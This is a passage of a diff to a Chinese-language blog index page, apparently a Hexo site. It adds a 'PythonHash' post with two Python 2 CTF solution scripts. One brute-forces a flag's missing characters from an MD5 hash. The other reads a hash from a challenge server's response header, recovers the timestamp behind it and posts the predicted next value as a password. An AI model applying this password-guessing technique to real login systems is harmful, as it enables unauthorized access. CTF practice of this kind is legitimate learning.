<span class="keyword">in</span> password):</span><br><span class="line">        <span class="keyword">print</span> str(cont),</span><br><span class="line">        password1 = str(cont)</span><br><span class="line">        print(md.hexdigest())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cont = cont + <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'end'</span></span><br><span class="line"></span><br><span class="line">md = hashlib.md5()</span><br><span class="line">md.update(str(int(password1) + <span class="number">1</span>).encode())</span><br><span class="line"><span class="keyword">print</span> int(password1)+<span class="number">1</span>,md.hexdigest()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">postdata = &#123;<span class="string">'password'</span>:str(int(password1) + <span class="number">1</span>),<span class="string">'submit_password'</span>:<span class="string">''</span>&#125;</span><br><span class="line">result = s.post(url=url,data = postdata)</span><br><span class="line">head = result.headers</span><br><span class="line"><span class="keyword">print</span> head,result.text</span><br></pre></td></tr></table></figure>
-
-<p># </p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/PythonHash/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/09/10/Python binascii模块/">展开全文 >></a>
         </p>
       
 
@@ -773,6 +689,85 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/09/10/PythonPIL简单编程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PythonHash" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/PythonHash/">PythonHash</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/PythonHash/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="PythonHash"><a href="#PythonHash" class="headerlink" title="PythonHash"></a>PythonHash</h3><p>以<strong>实验吧 密码学 ROT-13变身了</strong>为例：</p>
+<p>先rot13(ord(‘F’) - 83 = 13)下，拿到 flag{www_shiyanbar_com_is_very_good_xxxx}</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib,sys</span><br><span class="line"><span class="comment">#38e4c352809e150186920aac37190cbc</span></span><br><span class="line"></span><br><span class="line">arr  =  <span class="string">'flag&#123;www_shiyanbar_com_is_very_good_'</span></span><br><span class="line">count  =  <span class="number">0</span></span><br><span class="line"><span class="keyword">print</span>  <span class="string">'Run.'</span>,</span><br><span class="line"></span><br><span class="line">dict  =  <span class="string">'!"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~]'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  a  <span class="keyword">in</span>  dict:</span><br><span class="line">    <span class="keyword">for</span>  b  <span class="keyword">in</span>  dict:</span><br><span class="line">        <span class="keyword">for</span>  c  <span class="keyword">in</span>  dict:</span><br><span class="line">            <span class="keyword">for</span>  d  <span class="keyword">in</span>  dict:</span><br><span class="line">                count  +=  <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>  count  %  <span class="number">1000000</span>  ==  <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">print</span>  <span class="string">'.'</span>,</span><br><span class="line"></span><br><span class="line">                md5  =  hashlib.md5((arr+a+b+c+d+<span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()<span class="comment">#hashlib.md5(str.encode('utf-8')).hexdigest()</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>  md5  ==  <span class="string">'38e4c352809e150186920aac37190cbc'</span>:</span><br><span class="line">                    <span class="keyword">print</span>  <span class="string">'\n[*] '</span>,</span><br><span class="line">                    <span class="keyword">print</span>  md5,</span><br><span class="line">                    <span class="keyword">print</span>  arr+a+b+c+d+<span class="string">'&#125;'</span></span><br><span class="line">                    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.iloveflag.com:8002/index.php'</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">response = s.get(url)</span><br><span class="line">head = response.headers</span><br><span class="line"><span class="keyword">print</span> head</span><br><span class="line">password = head[<span class="string">'password'</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> password</span><br><span class="line">password1 = password</span><br><span class="line">cont = <span class="number">1540110000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(cont).encode())</span><br><span class="line">    <span class="comment">#print str(cont),md.hexdigest()</span></span><br><span class="line">    <span class="keyword">if</span> (md.hexdigest() <span class="keyword">in</span> password):</span><br><span class="line">        <span class="keyword">print</span> str(cont),</span><br><span class="line">        password1 = str(cont)</span><br><span class="line">        print(md.hexdigest())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cont = cont + <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'end'</span></span><br><span class="line"></span><br><span class="line">md = hashlib.md5()</span><br><span class="line">md.update(str(int(password1) + <span class="number">1</span>).encode())</span><br><span class="line"><span class="keyword">print</span> int(password1)+<span class="number">1</span>,md.hexdigest()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">postdata = &#123;<span class="string">'password'</span>:str(int(password1) + <span class="number">1</span>),<span class="string">'submit_password'</span>:<span class="string">''</span>&#125;</span><br><span class="line">result = s.post(url=url,data = postdata)</span><br><span class="line">head = result.headers</span><br><span class="line"><span class="keyword">print</span> head,result.text</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PythonHash/">展开全文 >></a>
         </p>
       
 
